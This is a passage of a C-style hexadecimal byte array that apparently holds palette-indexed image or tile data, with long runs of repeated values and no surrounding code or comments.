0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8,
0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8,
0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC9, 0xC9, 0xC9, 0xC9, 0xE0, 0xE1, 0xE2, 0x14,
0x9A, 0x17, 0x18, 0x18, 0x19, 0x19, 0x07, 0x1B, 0x1C, 0x1D, 0x1D, 0x1D, 0x1C, 0x19, 0x16, 0xE1,
0xE0, 0x12, 0x12, 0x12, 0x11, 0x12, 0x14, 0x9F, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E,
0x9E, 0x08, 0x14, 0xE6, 0x12, 0x11, 0x11, 0x12, 0xE5, 0x08, 0x16, 0x9E, 0x08, 0x08, 0x14, 0x14,
0x14, 0xE4, 0xE5, 0xCF, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x11, 0x12, 0x11,
0x11, 0x11, 0x11, 0x11, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x11, 0x11, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0xCF, 0xCF, 0xCF, 0xCF, 0xCF, 0xCF, 0xCF,
0xCF, 0xCF, 0xCF, 0xCF, 0xCF, 0xCF, 0xCE, 0xCF, 0xCF, 0xCF, 0xCF, 0xCF, 0xCF, 0x12, 0x12, 0x12,
0x11, 0x11, 0x11, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x11, 0x11, 0x11, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x13, 0x13, 0x13, 0x13, 0x13, 0xE4, 0x14, 0xE3, 0xE2, 0xE1, 0xE0, 0x12, 0x12,
0xC9, 0x12, 0x12, 0x12, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8,
0xC8, 0xC8, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0xC8, 0xC8, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8,
0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8,
0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0x12, 0xC8, 0xC8, 0x12, 0x12, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8,
0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8,
0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8,
0xC8, 0xC9, 0xC8, 0xC8, 0xE0, 0xE1, 0xE2, 0x14, 0x14, 0x14, 0x98, 0xAE, 0x17, 0x18, 0x18, 0x18,
0x08, 0x14, 0xC9, 0x12, 0x11, 0x12, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0xE4,
0xE4, 0xE5, 0xCE, 0x12, 0x11, 0x11, 0x11, 0x12, 0xE5, 0x14, 0x14, 0xE4, 0xE4, 0xE5, 0xE5, 0xE5,
0xE5, 0xE6, 0xE7, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x12, 0x12, 0xE8, 0xE8, 0xE7, 0xE8, 0xE8, 0xE7, 0xE7, 0xE6, 0xE5, 0xE5, 0xCA,
0x12, 0x11, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0xCF, 0xCF, 0xCF, 0xCF, 0xCF, 0xCF, 0xCF, 0xCF, 0xCF,
0xCF, 0xCF, 0xCF, 0xCF, 0xCF, 0xCF, 0xCF, 0xCF, 0xCF, 0xCF, 0xCF, 0xCF, 0xCF, 0x12, 0x12, 0x11,
0x11, 0x11, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x11, 0x11, 0x11, 0x11, 0x11, 0x12, 0x12, 0x12,
0x12, 0x12, 0x11, 0x12, 0x12, 0x12, 0x13, 0x14, 0xE3, 0xE2, 0xC9, 0xC9, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0xC8, 0xC8, 0xC8, 0xC8, 0xDF, 0xDF, 0xDD, 0xF4, 0x97, 0x96, 0x96, 0x96, 0x96, 0x97,
0xDE, 0xDF, 0xDF, 0xDF, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8,
0xC8, 0xC8, 0x12, 0x12, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8,
0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8,
0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8,
0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8,
0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xDF, 0xDF, 0x14, 0x9A, 0x18, 0x19,
0x19, 0x19, 0x99, 0x11, 0x12, 0xE2, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0xE4, 0xE4, 0xE4,
0xE5, 0xE6, 0x12, 0x11, 0x11, 0x11, 0x11, 0x12, 0xE5, 0xE4, 0xE5, 0xE6, 0xE6, 0xE6, 0xE6, 0xE5,
0xE6, 0xE6, 0xCE, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x11, 0x11, 0xCF, 0xE6, 0x14, 0x14, 0x14, 0x14, 0xE4, 0xE5, 0xE5, 0xE5, 0xE5, 0xE4, 0xE4, 0xCA,
0x11, 0x12, 0x12, 0x12, 0xCF, 0xCA, 0xCA, 0xCA, 0xCA, 0xCA, 0xCA, 0xCA, 0xCA, 0xCA, 0xCA, 0xCA,
0x12, 0x12, 0x12, 0x12, 0xCF, 0xCF, 0xCF, 0xCF, 0xCF, 0xCF, 0xCF, 0xCF, 0xCF, 0xCF, 0xCF, 0xCF,
0xCF, 0xCF, 0xCF, 0xCF, 0xCF, 0xCF, 0xCF, 0xCF, 0xCF, 0xCF, 0xCF, 0x12, 0x12, 0x12, 0x11, 0x11,
0x11, 0xCF, 0xE5, 0x14, 0x14, 0x14, 0xE6, 0xCF, 0xCF, 0x12, 0xCF, 0xCF, 0xCF, 0xCF, 0x12, 0x12,
0x12, 0x12, 0x11, 0xE0, 0xE0, 0x13, 0xE3, 0x13, 0xE0, 0xC9, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0xC8, 0xC8, 0xDF, 0xDE, 0x97, 0x96, 0x95, 0xAD, 0xAD, 0xAD, 0xAD, 0x95, 0xAD, 0xAD, 0xAD,
0xAD, 0x95, 0x95, 0x96, 0x97, 0xDD, 0xDF, 0xDF, 0xDF, 0xC8, 0xC8, 0xC8, 0xC8, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8,
0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8,
0xC8, 0xC8, 0xDF, 0xDF, 0xDF, 0xDF, 0xDF, 0xDF, 0xDE, 0xDE, 0xF6, 0xF6, 0xF5, 0xF5, 0xF6, 0xDF,
0xC8, 0xC8, 0xC8, 0xDF, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xDF, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8,
0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8,
0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC9, 0xC9, 0xC9, 0xE0, 0xE2, 0x16,
0x1B, 0x1C, 0x1C, 0x19, 0x17, 0x9A, 0x08, 0x08, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0xE4,
0xE5, 0xE6, 0x12, 0x11, 0x11, 0x11, 0x12, 0xE6, 0xE4, 0xE4, 0xE4, 0xE5, 0xE4, 0x14, 0x14, 0x08,
0x08, 0x14, 0xE5, 0xCF, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0xCA, 0x12, 0x11,
0x11, 0x12, 0x13, 0xE5, 0xE4, 0x14, 0xE4, 0xE4, 0xE5, 0xE5, 0xE5, 0xE4, 0xE4, 0xE4, 0xE5, 0x12,
0x12, 0x12, 0xCA, 0xCA, 0xCF, 0xCA, 0xCA, 0x13, 0x13, 0x13, 0xCE, 0xE3, 0xE3, 0x13, 0xCA, 0xCA,
0xCA, 0xCF, 0xCF, 0xCF, 0xCF, 0xCF, 0xCF, 0xCF, 0xCF, 0xCF, 0xCF, 0xCF, 0xCF, 0xCF, 0xCF, 0xCF,
0xCF, 0xCF, 0xCF, 0xCF, 0xCF, 0xCF, 0xCF, 0xCF, 0xCF, 0xCF, 0xCF, 0xCF, 0x12, 0x12, 0x11, 0x11,
0x12, 0xE6, 0xE4, 0xE5, 0xE5, 0xE5, 0xE7, 0xE8, 0xE8, 0xE8, 0xE8, 0xE7, 0xE7, 0xE7, 0xE7, 0xE6,
0xCF, 0x12, 0x11, 0x14, 0x14, 0x14, 0x13, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0xDF,
0xDE, 0xF4, 0x96, 0x95, 0xAD, 0xAD, 0xAC, 0xAC, 0xAC, 0xAD, 0x95, 0x95, 0x95, 0x95, 0xAD, 0xAD,
0xAD, 0xAD, 0xAD, 0x95, 0xAD, 0xAD, 0x95, 0x95, 0x96, 0x97, 0xF5, 0xDE, 0xDF, 0xC8, 0xC8, 0xC8,
0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0xC8, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8,
0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8,
0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xDF, 0xDF, 0xDF, 0xDF, 0xDE, 0x80, 0x97,
0x97, 0x96, 0x96, 0x96, 0x95, 0xAD, 0xAD, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC,
0x95, 0x96, 0xDD, 0xDF, 0xDF, 0xDF, 0xDF, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8,
0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8,
0xC8, 0xC8, 0xC8, 0x12, 0x12, 0x12, 0x12, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC9, 0xE0, 0xC9,
0x14, 0x17, 0x07, 0x1C, 0x1C, 0x1C, 0x19, 0x9B, 0x9A, 0x9A, 0x9A, 0x9A, 0x9A, 0x9E, 0x9E, 0x08,
0x08, 0xE4, 0x12, 0x11, 0x11, 0x11, 0xE7, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08,
0x08, 0x14, 0xE7, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x11,
0x11, 0x12, 0xE6, 0xE5, 0x14, 0x14, 0xE4, 0xE4, 0xE4, 0xE4, 0xE4, 0xE4, 0xE4, 0xE5, 0x13, 0x12,
0x12, 0x12, 0xCA, 0xCA, 0xCF, 0xCA, 0xCA, 0xCE, 0x13, 0xCE, 0xCE, 0xE6, 0xE3, 0xE6, 0xCA, 0xCA,
0xCF, 0x12, 0xCF, 0xCF, 0xCF, 0xCF, 0xCA, 0xCA, 0xCA, 0xCF, 0xCF, 0xCF, 0xCF, 0xCF, 0xCF, 0xCF,
0xCF, 0xCF, 0xCF, 0xCF, 0xCF, 0xCF, 0xCF, 0xCF, 0xCF, 0xCF, 0x12, 0x12, 0x12, 0x11, 0x11, 0x11,
0xE7, 0x14, 0x14, 0x14, 0xE6, 0xE7, 0xCF, 0xCF, 0xE7, 0xE7, 0xE7, 0xE7, 0xE6, 0xE6, 0xE6, 0xE7,
0x12, 0x11, 0x11, 0x14, 0x13, 0x13, 0xC9, 0x12, 0x12, 0x12, 0x12, 0xC8, 0xC8, 0xC8, 0xDD, 0x97,
0x96, 0xAE, 0xAD, 0xAD, 0x94, 0x94, 0x94, 0xAC, 0xAC, 0xAD, 0x95, 0x95, 0x95, 0x95, 0x94, 0x94,
0xAD, 0xAD, 0xAD, 0xAD, 0xAD, 0xAD, 0xAD, 0xAD, 0xAD, 0xAE, 0xAE, 0xAE, 0x95, 0x96, 0x97, 0xF5,
0xDD, 0xDF, 0xDF, 0xDF, 0xDF, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8,
0xC8, 0xC8, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8,
0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xDF,
0xDF, 0xDE, 0xDD, 0x80, 0x97, 0x97, 0x97, 0x96, 0x95, 0xAD, 0xAD, 0xAD, 0xAC, 0xAC, 0xAC, 0xAC,
0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC,
0xAC, 0xAC, 0xAC, 0x95, 0x97, 0xDE, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8,
0xC8, 0xC8, 0xC8, 0xDF, 0xDF, 0xDF, 0xC9, 0xDF, 0xDF, 0xDF, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8,
0x12, 0x12, 0x12, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0x12, 0x12, 0x12, 0x12, 0xC8, 0xE0, 0xE3, 0xE3,
0xC9, 0xE1, 0x08, 0x9A, 0x16, 0x17, 0x18, 0x17, 0x9B, 0x9B, 0x9B, 0x9A, 0x9A, 0x08, 0x08, 0x08,
0x08, 0xE5, 0x12, 0x11, 0x11, 0x12, 0xE4, 0x08, 0x9A, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08,
0x08, 0xE4, 0xCF, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x11, 0x11,
0x12, 0x13, 0xE5, 0xE4, 0x14, 0x14, 0xE4, 0xE4, 0xE4, 0xE4, 0xE4, 0xE4, 0x14, 0xE5, 0x12, 0x12,
0x12, 0x12, 0xCF, 0x12, 0x12, 0xCF, 0xCF, 0xCF, 0xCF, 0xCF, 0xCF, 0xCA, 0xCF, 0xCA, 0xCA, 0xCA,
0xCA, 0xCE, 0xCE, 0xCE, 0xCE, 0xCA, 0xCA, 0xCA, 0xCA, 0xCA, 0xCA, 0xCA, 0xCA, 0xCA, 0xCA, 0xCA,
0xCA, 0xCF, 0xCF, 0xCF, 0xCF, 0xCF, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x11, 0x11, 0x12,
0xE5, 0xE4, 0xE5, 0x14, 0xE6, 0xE7, 0xE7, 0xE7, 0xE7, 0xE7, 0xE6, 0xE6, 0xE6, 0xE6, 0x13, 0xE8,
0x11, 0x11, 0x11, 0xC9, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0xC8, 0xDF, 0xDD, 0x96, 0xAE,
0x95, 0x95, 0x95, 0x95, 0x94, 0x94, 0x94, 0x94, 0xAD, 0x95, 0x95, 0x95, 0x95, 0x94, 0x94, 0x94,
0xAD, 0xAD, 0xAD, 0xAD, 0xAD, 0xAD, 0xAD, 0xAD, 0xAD, 0xAD, 0xAD, 0xAD, 0xAD, 0xAD, 0xAD, 0xAD,
0xAD, 0xAD, 0x95, 0x96, 0x97, 0x97, 0xF5, 0xDE, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8,
0xC8, 0xC8, 0xC8, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8,
0xC8, 0xC8, 0xDF, 0xDF, 0xDF, 0xDF, 0xDE, 0xDD, 0x80, 0x97, 0x97, 0x96, 0x96, 0x95, 0x95, 0xAC,
0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC,
0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC,
0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAD, 0x96, 0x80, 0xDE, 0xDF, 0xDF, 0xDF, 0xC8, 0xC8, 0xC8, 0xC8,
0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8,
0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0x12, 0x12, 0x12, 0xC8, 0xC8, 0xC9, 0xE0, 0x14, 0x99,
0x17, 0x18, 0x19, 0x07, 0x1B, 0x1B, 0x1B, 0x1B, 0x07, 0x17, 0x9C, 0x9C, 0x9B, 0x9A, 0x99, 0x08,
0x14, 0x13, 0x11, 0x11, 0x11, 0x12, 0x14, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08,
0x08, 0xE5, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x11, 0x11,
0xCF, 0xE6, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0xE4, 0xE4, 0x14, 0x14, 0x14, 0xCE, 0x12, 0x12,
0x12, 0xCF, 0x12, 0x12, 0xCF, 0x12, 0x12, 0x12, 0xCF, 0xCF, 0xCF, 0xCF, 0xCF, 0xCF, 0xCF, 0xCF,
0xCF, 0xCF, 0xCF, 0xCF, 0xCF, 0xCF, 0xCF, 0xCF, 0xCF, 0xCF, 0xCA, 0xCA, 0xCA, 0xCA, 0xCF, 0xCA,
0xCA, 0xCA, 0xE8, 0xCF, 0xCF, 0x12, 0x12, 0xCF, 0x12, 0x12, 0x12, 0x12, 0x11, 0x11, 0x11, 0xE8,
0xE5, 0xE4, 0x14, 0x14, 0xE7, 0xE8, 0xE7, 0xE7, 0xE7, 0xE7, 0xE6, 0xE6, 0xE6, 0xE6, 0x13, 0x12,
0x11, 0x11, 0x11, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x11, 0x11, 0x12, 0xDF, 0x97, 0x96, 0xAF,
0x95, 0x95, 0x95, 0x95, 0x94, 0x94, 0x94, 0x94, 0xAD, 0x95, 0x95, 0x95, 0x95, 0x94, 0x94, 0xAD,
0xAD, 0xAD, 0xAD, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0x94, 0x94, 0xAD,
0xAD, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAD, 0xAE, 0x96, 0x97, 0xF5, 0xDE, 0xDF, 0xC8, 0xC8,
0xC8, 0xC8, 0xC8, 0xC8, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xDF, 0xDF, 0xDE, 0xDE, 0xDD, 0xDC, 0x97,
0x96, 0x96, 0x95, 0x95, 0xAD, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC,
0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC,
0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0x94, 0x94, 0x94, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC,
0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0x17, 0xAE, 0x97, 0xDE, 0xDF, 0xC8, 0xC8, 0xC8, 0xC8,
0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0x12, 0x11, 0x11, 0x11, 0x12, 0x12,
0xC8, 0xC8, 0xC8, 0x12, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8,
0xC9, 0xE1, 0xE3, 0x14, 0x08, 0x9A, 0x17, 0x18, 0x07, 0x19, 0x17, 0x9B, 0x9A, 0x99, 0x08, 0x08,
0x14, 0xC9, 0x11, 0x11, 0x11, 0xCE, 0x08, 0x9A, 0x9A, 0x9A, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08,
0x08, 0xCE, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x11, 0x11, 0x12,
0xE6, 0x14, 0x14, 0x14, 0x14, 0xE4, 0xE5, 0xE5, 0xE4, 0xE4, 0x14, 0x14, 0xE4, 0xCF, 0x12, 0x12,
0xCF, 0xCA, 0xCA, 0x12, 0xCF, 0x12, 0x12, 0x12, 0xCF, 0xCF, 0xCF, 0xCF, 0xCF, 0xCF, 0xCF, 0xCF,
0xCF, 0xCF, 0xCF, 0xCF, 0xCF, 0xCF, 0xCF, 0xCF, 0xCF, 0x12, 0x12, 0xCF, 0xCF, 0xCF, 0xCF, 0xCF,
0xCF, 0xE8, 0xE8, 0xCF, 0x12, 0x12, 0xCF, 0x12, 0x12, 0x12, 0x12, 0x11, 0x11, 0x11, 0x12, 0xE5,
0x14, 0x14, 0xE4, 0xE6, 0xE8, 0xE7, 0xE5, 0xE6, 0xE6, 0xE7, 0xE6, 0xE7, 0xE6, 0xE5, 0x12, 0x11,
0x11, 0x11, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x11, 0xF5, 0x17, 0x17, 0xAD,
0xAE, 0xAF, 0x95, 0x95, 0x95, 0x95, 0x95, 0xAD, 0x95, 0x95, 0x95, 0x95, 0x95, 0x95, 0x94, 0xAD,
0x95, 0xAD, 0xAC, 0x19, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x19, 0x18, 0xAC, 0x94, 0x94, 0x94, 0x94,
0x94, 0x94, 0x94, 0x94, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAD, 0x95, 0x96,
0x97, 0xDD, 0xDE, 0xDF, 0xC6, 0xC6, 0xC6, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC6, 0xC6,
0xDF, 0xDE, 0xDE, 0xDD, 0x80, 0x97, 0x96, 0x95, 0x95, 0xAD, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC,
0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0x94, 0x94, 0xAC, 0x94, 0xAC, 0xAC, 0xAC, 0xAC,
0xAC, 0xAC, 0xAC, 0x94, 0x94, 0x94, 0x94, 0x94, 0x94, 0x94, 0x94, 0x94, 0x94, 0x94, 0x94, 0x94,
0x94, 0xAC, 0xAC, 0xAC, 0x94, 0x94, 0x94, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC,
0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAD, 0x96, 0xDE, 0xDF, 0xDF, 0xC8,
0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0x12, 0x12, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x12,
